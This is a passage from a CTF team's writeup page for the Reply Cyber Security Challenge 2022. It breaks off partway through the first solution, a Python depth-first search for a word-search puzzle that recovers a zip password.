<!DOCTYPE html><html lang="en" data-astro-cid-dxom2xcl> <head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><meta name="generator" content="Astro v4.16.18"><!-- Font preloads --><link rel="preload" href="/fonts/atkinson-regular.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/fonts/atkinson-bold.woff" as="font" type="font/woff" crossorigin><!-- Canonical URL --><link rel="canonical" href="https://localhost:3000/writeups/2022-10-31-reply2022/"><!-- Primary Meta Tags --><title>Reply Cyber Security Challenge 2022</title><meta name="title" content="Reply Cyber Security Challenge 2022"><meta name="description" content="Writeups of all solved challenges during Reply Cyber Security Challenge 2022"><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://localhost:3000/writeups/2022-10-31-reply2022/"><meta property="og:title" content="Reply Cyber Security Challenge 2022"><meta property="og:description" content="Writeups of all solved challenges during Reply Cyber Security Challenge 2022"><meta property="og:image" content="https://localhost:3000/blog-placeholder-1.jpg"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://localhost:3000/writeups/2022-10-31-reply2022/"><meta property="twitter:title" content="Reply Cyber Security Challenge 2022"><meta property="twitter:description" content="Writeups of all solved challenges during Reply Cyber Security Challenge 2022"><meta property="twitter:image" content="https://localhost:3000/blog-placeholder-1.jpg"><style>:root{--accent: #fea819;--accent-dark: #ac7010}@font-face{font-family:Atkinson;src:url(/fonts/atkinson-regular.woff) format("woff");font-weight:400;font-style:normal;font-display:swap}@font-face{font-family:Atkinson;src:url(/fonts/atkinson-bold.woff) format("woff");font-weight:700;font-style:normal;font-display:swap}body{font-family:Atkinson,sans-serif;margin:0;padding:0;text-align:left;background:#171717 no-repeat;background-size:100% 600px;word-wrap:break-word;overflow-wrap:break-word;color:#aaa;font-size:20px;line-height:1.7}main{width:720px;max-width:calc(100% - 2em);margin:auto;padding:3em 1em}h1,h2,h3,h4,h5,h6{margin:0 0 .5rem;color:#fff;line-height:1.2}h1{font-size:3.052em}h2{font-size:2.441em}h3{font-size:1.953em}h4{font-size:1.563em}h5{font-size:1.25em}strong,b{font-weight:700}a,a:hover{color:var(--accent)}p{margin-bottom:1em}.prose p{margin-bottom:2em}textarea{width:100%;font-size:16px}input{font-size:16px}table{width:100%}img{max-width:100%;height:auto;border-radius:8px}code{padding:2px 5px;background-color:#1f1f1f;border-radius:2px}pre{padding:1.5em;border-radius:8px}pre>code{all:unset;font-size:.9em}blockquote{border-left:4px solid var(--accent);padding:0 0 0 20px;margin:0;font-size:1.333em}hr{border:none;border-top:1px solid #e9e9e9}@media (max-width: 720px){body{font-size:18px}main{padding:1em}}.sr-only{border:0;padding:0;margin:0;position:absolute!important;height:1px;width:1px;overflow:hidden;clip:rect(1px 1px 1px 1px);clip:rect(1px,1px,1px,1px);clip-path:inset(50%);white-space:nowrap}a[data-astro-cid-eimmu3lg]{display:inline-block;text-decoration:none}a[data-astro-cid-eimmu3lg].active{font-weight:bolder;text-decoration:underline}header[data-astro-cid-3ef6ksr2]{margin:0;padding:0 1em;background:#1f1f1f;box-shadow:0 2px 8px rgba(var(--black),5%)}h2[data-astro-cid-3ef6ksr2]{margin:0;font-size:1em}h2[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2],h2[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2].active{text-decoration:none}nav[data-astro-cid-3ef6ksr2]{display:flex;align-items:center;justify-content:space-between}nav[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2]{padding:1em .5em;color:var(--black);border-bottom:4px solid transparent;text-decoration:none}nav[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2].active{text-decoration:none;border-bottom-color:var(--accent)}.social-links[data-astro-cid-3ef6ksr2],.social-links[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2]{display:flex}@media (max-width: 720px){.social-links[data-astro-cid-3ef6ksr2]{display:none}}footer[data-astro-cid-sz7xmlte]{padding:2em 1em 6em;background:linear-gradient(var(--gray-gradient)) no-repeat;color:rgb(var(--gray));text-align:center}.social-links[data-astro-cid-sz7xmlte]{display:flex;justify-content:center;gap:1em;margin-top:1em}.social-links[data-astro-cid-sz7xmlte] a[data-astro-cid-sz7xmlte]{text-decoration:none;color:rgb(var(--gray))}.social-links[data-astro-cid-sz7xmlte] a[data-astro-cid-sz7xmlte]:hover{color:rgb(var(--gray-dark))}
main[data-astro-cid-dxom2xcl]{width:calc(100% - 2em);max-width:100%;margin:0}.hero-image[data-astro-cid-dxom2xcl]{width:100%}.hero-image[data-astro-cid-dxom2xcl] img[data-astro-cid-dxom2xcl]{display:block;margin:0 auto;border-radius:12px;box-shadow:var(--box-shadow)}.prose[data-astro-cid-dxom2xcl]{width:75%;max-width:calc(100% - 2em);margin:auto;padding:1em;color:rgb(var(--gray-dark))}.title[data-astro-cid-dxom2xcl]{margin-bottom:1em;padding:1em 0;text-align:center;line-height:1}.title[data-astro-cid-dxom2xcl] h1[data-astro-cid-dxom2xcl]{margin:0 0 .5em}.date[data-astro-cid-dxom2xcl]{margin-bottom:.5em;color:rgb(var(--gray))}.last-updated-on[data-astro-cid-dxom2xcl]{font-style:italic}
</style></head> <body data-astro-cid-dxom2xcl> <header data-astro-cid-3ef6ksr2> <nav data-astro-cid-3ef6ksr2> <a href="/" style="padding: 1rem 0 0 0;" data-astro-cid-3ef6ksr2> <img src="/new_tower_logo.png" alt="Tower of Hanoi Logo" width="50rem" height="50rem" style="border-radius: 0;" data-astro-cid-3ef6ksr2> </a> <div class="internal-links" data-astro-cid-3ef6ksr2> <a href="/" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> Home </a>  <a href="/blog" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> Blogposts </a>  <a href="/writeups" class="active" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> Writeups </a>  <a href="/about" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> About </a>  </div> <div class="social-links" data-astro-cid-3ef6ksr2> <a href="https://x.com/towerofhanoi" target="_blank" data-astro-cid-3ef6ksr2> <span class="sr-only" data-astro-cid-3ef6ksr2>Follow Tower of Hanoi on Twitter</span> <svg viewBox="0 0 16 16" aria-hidden="true" width="32" height="32" data-astro-cid-3ef6ksr2><path fill="currentColor" d="M5.026 15c6.038 0 9.341-5.003 9.341-9.334 0-.14 0-.282-.006-.422A6.685 6.685 0 0 0 16 3.542a6.658 6.658 0 0 1-1.889.518 3.301 3.301 0 0 0 1.447-1.817 6.533 6.533 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.325 9.325 0 0 1-6.767-3.429 3.289 3.289 0 0 0 1.018 4.382A3.323 3.323 0 0 1 .64 6.575v.045a3.288 3.288 0 0 0 2.632 3.218 3.203 3.203 0 0 1-.865.115 3.23 3.23 0 0 1-.614-.057 3.283 3.283 0 0 0 3.067 2.277A6.588 6.588 0 0 1 .78 13.58a6.32 6.32 0 0 1-.78-.045A9.344 9.344 0 0 0 5.026 15z" data-astro-cid-3ef6ksr2></path></svg> </a> <a href="https://github.com/towerofhanoi" target="_blank" data-astro-cid-3ef6ksr2> <span class="sr-only" data-astro-cid-3ef6ksr2>Go to Tower of Hanoi's GitHub repo</span> <svg viewBox="0 0 16 16" aria-hidden="true" width="32" height="32" data-astro-cid-3ef6ksr2><path fill="currentColor" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.012 8.012 0 0 0 16 8c0-4.42-3.58-8-8-8z" data-astro-cid-3ef6ksr2></path></svg> </a> <a href="https://ctftime.org/team/300" target="_blank" data-astro-cid-3ef6ksr2> <span class="sr-only" data-astro-cid-3ef6ksr2>Go to Tower of Hanoi's CTF Time page</span> <svg viewBox="0 0 16 16" width="32" height="32" data-astro-cid-3ef6ksr2> <path fill="currentColor" d="M 0,0 H 16 V 16 H 0 L 4.7205698,7.7838485 Z" data-astro-cid-3ef6ksr2></path> </svg> </a> </div> </nav> </header>  <main data-astro-cid-dxom2xcl> <article data-astro-cid-dxom2xcl> <div class="hero-image" data-astro-cid-dxom2xcl> <img width="720" height="360" src="/writeup_images/reply-2022.png" alt="" data-astro-cid-dxom2xcl> </div> <div class="prose" data-astro-cid-dxom2xcl> <div class="title" data-astro-cid-dxom2xcl> <div class="date" data-astro-cid-dxom2xcl> <time datetime="2022-11-01T11:37:00.000Z"> Nov 1, 2022 </time>  </div> <h1 data-astro-cid-dxom2xcl>Reply Cyber Security Challenge 2022</h1> <h3 data-astro-cid-dxom2xcl> by Tower of Hanoi</h3> <hr data-astro-cid-dxom2xcl> </div>  <p>On October 14th and 15th 2022 we participated in the <a href="https://challenges.reply.com/tamtamy/challenges/category/cybersecurity">Reply Cyber Security Challenge 2022</a>. We solved many challenges and overall placed second (<a href="https://ctftime.org/event/1731/">CTFtime</a>). These are the writeups of the challenges we solved during the event, sorted by category and points value.</p>
<ul>
<li><a href="#coding-55">Coding</a>
<ul>
<li><a href="#coding-100">Coding 100</a></li>
<li><a href="#coding-200">Coding 200</a></li>
<li><a href="#coding-300">Coding 300</a></li>
<li><a href="#coding-400">Coding 400</a></li>
<li><a href="#coding-500">Coding 500</a></li>
</ul>
</li>
<li><a href="#web-45">Web</a>
<ul>
<li><a href="#web-100">Web 100</a></li>
<li><a href="#web-200">Web 200</a></li>
<li><a href="#web-300">Web 300</a></li>
<li><a href="#web-400">Web 400</a></li>
</ul>
</li>
<li><a href="#binary-45">Binary</a>
<ul>
<li><a href="#binary-100">Binary 100</a></li>
<li><a href="#binary-200">Binary 200</a></li>
<li><a href="#binary-300">Binary 300</a></li>
<li><a href="#binary-400">Binary 400</a></li>
</ul>
</li>
<li><a href="#crypto-35">Crypto</a>
<ul>
<li><a href="#crypto-100">Crypto 100</a></li>
<li><a href="#crypto-200">Crypto 200</a></li>
<li><a href="#crypto-300">Crypto 300</a></li>
</ul>
</li>
<li><a href="#misc-45">Misc</a>
<ul>
<li><a href="#misc-100">Misc 100</a></li>
<li><a href="#misc-200">Misc 200</a></li>
<li><a href="#misc-300">Misc 300</a></li>
<li><a href="#misc-500">Misc 500</a></li>
</ul>
</li>
</ul>
<h2 id="coding-55">Coding (5/5)</h2>
<h3 id="coding-100">Coding 100</h3>
<h4 id="overview">Overview</h4>
<p>We are given a grid and a list of words, we have to find all the words and join the remainings characters in order to get the <code>flag.zip</code> password.</p>
<p>Words can be read in all 8 directions and the horizontal and vertical ones can make at most one 90 degrees turn.</p>
<h4 id="solution">Solution</h4>
<p>We can do a simple dfs starting from every point in the grid and search for the words (and I wrote it in the ugliest possible way).</p>
<p>We take 7 parameters:</p>
<ul>
<li><code>y</code>, <code>x</code>: the coordinates</li>
<li><code>d</code>: the direction</li>
<li><code>pref</code>: the word build so far</li>
<li><code>poss</code>: the visited cells (I don’t know why I named it like this)</li>
<li><code>not_changed</code>: if I already took a 90 degrees turn</li>
</ul>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> search</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> x</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> d</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pref</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> vis</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> poss</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> not_changed</span><span style="color:#666666">):</span></span>
<span class="line"></span></code></pre>
<p>The base case happens when we found a word</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#4D9375">    if</span><span style="color:#DBD7CAEE"> pref </span><span style="color:#CB7676">in</span><span style="color:#DBD7CAEE"> words</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">        words</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">remove</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">pref</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#4D9375">        for</span><span style="color:#DBD7CAEE"> Y</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> X </span><span style="color:#4D9375">in</span><span style="color:#DBD7CAEE"> poss</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">            grid</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">Y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">X</span><span style="color:#666666">]</span><span style="color:#666666"> =</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">.</span><span style="color:#C98A7D77">'</span></span>
<span class="line"></span></code></pre>
<p>Then we check if the cell is valid:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#758575DD">    # If in the grid</span></span>
<span class="line"><span style="color:#4D9375">    if</span><span style="color:#DBD7CAEE"> y </span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 0</span><span style="color:#CB7676"> or</span><span style="color:#DBD7CAEE"> y </span><span style="color:#CB7676">>=</span><span style="color:#B8A965"> len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">grid</span><span style="color:#666666">)</span><span style="color:#CB7676"> or</span><span style="color:#DBD7CAEE"> x </span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 0</span><span style="color:#CB7676"> or</span><span style="color:#DBD7CAEE"> x </span><span style="color:#CB7676">>=</span><span style="color:#B8A965"> len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">grid</span><span style="color:#666666">[</span><span style="color:#4C9A91">0</span><span style="color:#666666">]):</span><span style="color:#4D9375"> return</span><span style="color:#4D9375"> False</span></span>
<span class="line"><span style="color:#758575DD">    # If not in a previous word</span></span>
<span class="line"><span style="color:#4D9375">    if</span><span style="color:#DBD7CAEE"> grid</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">.</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span><span style="color:#4D9375"> return</span><span style="color:#4D9375"> False</span></span>
<span class="line"><span style="color:#758575DD">    # If already in the current path</span></span>
<span class="line"><span style="color:#4D9375">    if</span><span style="color:#DBD7CAEE"> vis</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">]:</span><span style="color:#4D9375"> return</span><span style="color:#4D9375"> False</span><span style="color:#758575DD">  # Obviously useless</span></span>
<span class="line"></span></code></pre>
<p>And then we update the cell status and hardcode every possibility:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#DBD7CAEE">    vis</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">]</span><span style="color:#666666"> =</span><span style="color:#4D9375"> True</span></span>
<span class="line"><span style="color:#DBD7CAEE">    poss</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">append</span><span style="color:#666666">((</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> x</span><span style="color:#666666">))</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">    if</span><span style="color:#DBD7CAEE"> d </span><span style="color:#CB7676">==</span><span style="color:#C99076"> UP</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> search</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">y </span><span style="color:#CB7676">-</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> x</span><span style="color:#666666">,</span><span style="color:#C99076"> UP</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pref </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> grid</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">],</span><span style="color:#DBD7CAEE"> vis</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> poss</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> not_changed</span><span style="color:#666666">):</span><span style="color:#4D9375"> return</span><span style="color:#4D9375"> True</span></span>
<span class="line"><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> not_changed</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">            if</span><span style="color:#DBD7CAEE"> search</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> x </span><span style="color:#CB7676">-</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#C99076"> LEFT</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pref </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> grid</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">],</span><span style="color:#DBD7CAEE"> vis</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> poss</span><span style="color:#666666">,</span><span style="color:#4D9375"> False</span><span style="color:#666666">):</span><span style="color:#4D9375"> return</span><span style="color:#4D9375"> True</span></span>
<span class="line"><span style="color:#4D9375">            if</span><span style="color:#DBD7CAEE"> search</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> x </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#C99076"> RIGHT</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pref </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> grid</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">],</span><span style="color:#DBD7CAEE"> vis</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> poss</span><span style="color:#666666">,</span><span style="color:#4D9375"> False</span><span style="color:#666666">):</span><span style="color:#4D9375"> return</span><span style="color:#4D9375"> True</span></span>
<span class="line"><span style="color:#4D9375">    elif</span><span style="color:#DBD7CAEE"> d </span><span style="color:#CB7676">==</span><span style="color:#C99076"> DOWN</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> search</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">y </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> x</span><span style="color:#666666">,</span><span style="color:#C99076"> DOWN</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pref </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> grid</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">],</span><span style="color:#DBD7CAEE"> vis</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> poss</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> not_changed</span><span style="color:#666666">):</span><span style="color:#4D9375"> return</span><span style="color:#4D9375"> True</span></span>
<span class="line"><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> not_changed</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">            if</span><span style="color:#DBD7CAEE"> search</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> x </span><span style="color:#CB7676">-</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#C99076"> LEFT</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pref </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> grid</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">],</span><span style="color:#DBD7CAEE"> vis</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> poss</span><span style="color:#666666">,</span><span style="color:#4D9375"> False</span><span style="color:#666666">):</span><span style="color:#4D9375"> return</span><span style="color:#4D9375"> True</span></span>
<span class="line"><span style="color:#4D9375">            if</span><span style="color:#DBD7CAEE"> search</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> x </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#C99076"> RIGHT</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pref </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> grid</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">],</span><span style="color:#DBD7CAEE"> vis</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> poss</span><span style="color:#666666">,</span><span style="color:#4D9375"> False</span><span style="color:#666666">):</span><span style="color:#4D9375"> return</span><span style="color:#4D9375"> True</span></span>
<span class="line"><span style="color:#4D9375">    elif</span><span style="color:#DBD7CAEE"> d </span><span style="color:#CB7676">==</span><span style="color:#C99076"> LEFT</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> search</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> x </span><span style="color:#CB7676">-</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#C99076"> LEFT</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pref </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> grid</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">],</span><span style="color:#DBD7CAEE"> vis</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> poss</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> not_changed</span><span style="color:#666666">):</span><span style="color:#4D9375"> return</span><span style="color:#4D9375"> True</span></span>
<span class="line"><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> not_changed</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">            if</span><span style="color:#DBD7CAEE"> search</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">y </span><span style="color:#CB7676">-</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> x</span><span style="color:#666666">,</span><span style="color:#C99076"> UP</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pref </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> grid</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">],</span><span style="color:#DBD7CAEE"> vis</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> poss</span><span style="color:#666666">,</span><span style="color:#4D9375"> False</span><span style="color:#666666">):</span><span style="color:#4D9375"> return</span><span style="color:#4D9375"> True</span></span>
<span class="line"><span style="color:#4D9375">            if</span><span style="color:#DBD7CAEE"> search</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">y </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> x</span><span style="color:#666666">,</span><span style="color:#C99076"> DOWN</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pref </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> grid</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">],</span><span style="color:#DBD7CAEE"> vis</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> poss</span><span style="color:#666666">,</span><span style="color:#4D9375"> False</span><span style="color:#666666">):</span><span style="color:#4D9375"> return</span><span style="color:#4D9375"> True</span></span>
<span class="line"><span style="color:#4D9375">    elif</span><span style="color:#DBD7CAEE"> d </span><span style="color:#CB7676">==</span><span style="color:#C99076"> RIGHT</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> search</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> x </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#C99076"> RIGHT</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pref </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> grid</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">],</span><span style="color:#DBD7CAEE"> vis</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> poss</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> not_changed</span><span style="color:#666666">):</span><span style="color:#4D9375"> return</span><span style="color:#4D9375"> True</span></span>
<span class="line"><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> not_changed</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">            if</span><span style="color:#DBD7CAEE"> search</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">y </span><span style="color:#CB7676">-</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> x</span><span style="color:#666666">,</span><span style="color:#C99076"> UP</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pref </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> grid</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">],</span><span style="color:#DBD7CAEE"> vis</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> poss</span><span style="color:#666666">,</span><span style="color:#4D9375"> False</span><span style="color:#666666">):</span><span style="color:#4D9375"> return</span><span style="color:#4D9375"> True</span></span>
<span class="line"><span style="color:#4D9375">            if</span><span style="color:#DBD7CAEE"> search</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">y </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> x</span><span style="color:#666666">,</span><span style="color:#C99076"> DOWN</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pref </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> grid</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">],</span><span style="color:#DBD7CAEE"> vis</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> poss</span><span style="color:#666666">,</span><span style="color:#4D9375"> False</span><span style="color:#666666">):</span><span style="color:#4D9375"> return</span><span style="color:#4D9375"> True</span></span>
<span class="line"><span style="color:#4D9375">    elif</span><span style="color:#DBD7CAEE"> d </span><span style="color:#CB7676">==</span><span style="color:#C99076"> UR</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> search</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">y </span><span style="color:#CB7676">-</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> x </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#C99076"> UR</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pref </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> grid</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">],</span><span style="color:#DBD7CAEE"> vis</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> poss</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> not_changed</span><span style="color:#666666">):</span><span style="color:#4D9375"> return</span><span style="color:#4D9375"> True</span></span>
